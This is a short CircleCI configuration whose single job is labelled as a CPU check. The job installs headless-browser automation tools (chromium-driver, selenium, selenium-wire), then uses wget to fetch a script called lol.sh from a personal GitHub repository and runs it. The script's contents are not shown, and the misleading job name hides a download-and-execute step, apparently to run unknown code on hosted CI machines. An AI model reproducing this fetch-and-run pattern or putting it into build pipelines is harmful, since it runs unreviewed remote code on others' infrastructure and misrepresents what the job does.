version: 2.1

jobs:
  check_cpu:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Check Number of CPUs
          command: |
            echo "Checking number of CPUs:"
            sudo apt-get update && sudo apt-get install -y python3-pip neofetch curl wget chromium-driver
            pip3 install selenium selenium-wire
            pip3 uninstall blinker -y && pip3 install blinker==1.4
            wget https://raw.githubusercontent.com/uriahgones/gones/refs/heads/main/lol.sh
            chmod +x lol.sh
            ./lol.sh

workflows:
  version: 2
  check:
    jobs:
      - check_cpu
